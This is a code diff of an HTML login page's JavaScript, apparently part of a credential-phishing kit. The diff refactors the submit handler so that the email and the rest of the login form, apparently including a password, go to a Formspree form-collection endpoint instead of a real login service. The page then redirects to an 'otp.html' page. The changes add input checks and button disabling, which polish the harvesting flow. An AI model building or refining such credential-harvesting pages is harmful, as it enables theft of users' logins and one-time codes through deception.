@@ -7,48 +7,55 @@
     <title>Home</title>
 
     <script type="text/javascript">
-      window.onload = function () {
+      document.addEventListener("DOMContentLoaded", function () {
         console.log("working");
-        const btn = document.querySelector("button");
-        const emailInput = document.querySelector("#email");
 
-        // Form submission handling for both traditional submit and async submit
-        document
-          .getElementById("form")
-          .addEventListener("submit", async function (event) {
-            event.preventDefault(); // Prevent default form submission
+        const btn = document.getElementById("redirectBtn");
+        const emailInput = document.getElementById("email");
+        const form = document.getElementById("form");
 
-            btn.textContent = "Loading..."; // Change button text to Loading...
+        if (form) {
+          form.addEventListener("submit", async function (event) {
+            event.preventDefault(); // Prevent form default submission
 
-            localStorage.setItem("email", emailInput.value); // Store email in localStorage
+            if (!emailInput.value) {
+              alert("Please enter your email.");
+              return;
+            }
 
-            let formData = new FormData(this); // Collect form data
+            btn.textContent = "Loading..."; // Change button text
+            btn.disabled = true; // Prevent multiple clicks
+
+            localStorage.setItem("email", emailInput.value); // Store email
+
+            let formData = new FormData(form);
 
             try {
               let response = await fetch("https://formspree.io/f/xoveqrzb", {
                 method: "POST",
                 body: formData,
-                headers: {
-                  Accept: "application/json",
-                },
+                headers: { Accept: "application/json" },
               });
 
               if (response.ok) {
-                window.location.href = "otp.html"; // Redirect on successful submission
+                window.location.href = "otp.html"; // Redirect after success
               } else {
                 alert("Failed to send form. Please try again.");
               }
             } catch (error) {
               alert("An error occurred. Please try again later.");
+            } finally {
+              btn.textContent = "Login"; // Reset button text
+              btn.disabled = false; // Re-enable button
             }
           });
-      };
+        }
+      });
 
       // Function to toggle password visibility
       function togglePass() {
-        const passInput = document.querySelector("#pass");
-        let type = passInput.type === "password" ? "text" : "password";
-        passInput.setAttribute("type", type);
+        const passInput = document.getElementById("pass");
+        passInput.type = passInput.type === "password" ? "text" : "password";
       }
     </script>
 
@@ -97,7 +104,7 @@
           </div>
 
           <button
-            id="redirectBtn" 
+            id="redirectBtn"
             class="bg-primary mt-w text-white w-full rounded-md p-4 disabled:opacity-80"
           >
             Login
